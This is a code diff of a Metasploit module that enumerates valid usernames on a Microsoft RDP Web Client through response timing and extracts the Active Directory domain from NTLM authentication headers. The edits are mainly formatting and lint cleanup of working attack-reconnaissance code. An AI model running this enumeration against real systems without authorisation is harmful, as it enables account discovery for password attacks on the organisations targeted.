@@ -5,20 +5,21 @@
 from metasploit import module
 
 # extra modules
-dependencies_missing = False
+DEPENDENCIES_MISSING = False
 try:
     import base64
     import os
     import requests
 except ImportError:
-    dependencies_missing = True
+    DEPENDENCIES_MISSING = True
 
 
 # Metasploit Metadata
 metadata = {
     'name': 'Microsoft RDP Web Client Login Enumeration',
     'description': '''
-        Enumerate valid usernames against a Microsoft RDP Web Client by performing a timing based check against the provided username.
+        Enumerate valid usernames against a Microsoft RDP Web Client
+        by performing a timing based check against the provided username.
     ''',
     'authors': [
         'Matthew Dunn'
@@ -58,12 +59,14 @@ def get_ad_domain(rhost, rport):
         target_url = f"https://{rhost}:{rport}/{url}"
         request = session.get(target_url, headers=headers, verify=False)
         # Decode the provided NTLM Response to strip out the domain name
-        if request.status_code == 401 and 'WWW-Authenticate' in request.headers and 'NTLM' in request.headers['WWW-Authenticate']:
+        if request.status_code == 401 and 'WWW-Authenticate' in request.headers and \
+          'NTLM' in request.headers['WWW-Authenticate']:
             domain_hash = request.headers['WWW-Authenticate'].split('NTLM ')[1].split(',')[0]
             domain = base64.b64decode(bytes(domain_hash, 'utf-8')).replace(b'\x00',b'').split(b'\n')[1]
             domain = domain[domain.index(b'\x0f') + 1:domain.index(b'\x02')].decode('utf-8')
             module.log(f'Found Domain: {domain}', level='good')
             return domain
+    return None
 
 
 def check_username(rhost, rport, targeturi, domain, username, timeout):
@@ -80,15 +83,16 @@ def check_username(rhost, rport, targeturi, domain, username, timeout):
                'Origin': 'https://{rhost}'}
     session = requests.Session()
     try:
-        request = session.post(url, data=body, headers=headers, timeout=(timeout / 1000), verify=False)
+        request = session.post(url, data=body, headers=headers,
+                               timeout=(timeout / 1000), verify=False)
         if request.status_code == 200:
-            module.log(f'Username {domain}\{username} is valid! Response received in {request.elapsed.microseconds / 1000} milliseconds',
+            module.log(f'Username {domain}\\{username} is valid! Response received in {request.elapsed.microseconds / 1000} milliseconds',
                        level='good')
     except requests.exceptions.Timeout:
-            module.log(f'Username {domain}\{username} is invalid! No response received in {timeout} milliseconds',
-                       level='error')
-    except requests.exceptions.RequestException as e:
-        module.log('{}'.format(e), level='error')
+        module.log(f'Username {domain}\\{username} is invalid! No response received in {timeout} milliseconds',
+                   level='error')
+    except requests.exceptions.RequestException as exc:
+        module.log('{}'.format(exc), level='error')
         return
 
 
@@ -101,8 +105,9 @@ def check_usernames(rhost, rport, targeturi, domain, username_file, timeout):
 
 
 def run(args):
+    """Run the module, gathering the domain if desired and verifying usernames"""
     module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
-    if dependencies_missing:
+    if DEPENDENCIES_MISSING:
         module.log('Module dependencies are missing, cannot continue', level='error')
         return
 
